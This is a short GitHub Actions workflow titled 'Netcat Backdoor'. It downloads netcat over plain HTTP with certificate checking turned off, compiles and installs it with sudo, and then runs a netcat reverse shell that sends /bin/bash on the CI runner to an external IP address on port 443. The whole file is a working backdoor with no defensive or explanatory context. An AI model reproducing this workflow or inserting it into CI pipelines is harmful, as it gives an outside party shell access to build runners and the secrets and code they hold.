name: InfoSec Relations - Offensive Engineering - Netcat Backdoor

on: [workflow_dispatch]

jobs:
  nsec:
    runs-on: ubuntu-latest
    name: InfoSec Relations - Offensive Engineering
    steps:
      - run: |
            wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
            tar -xzvf netcat-0.7.1.tar.gz
            cd netcat-0.7.1 
            ./configure
            sudo make
            sudo make install
      - run: | 
            nc 13.218.107.116 443 -e /bin/bash
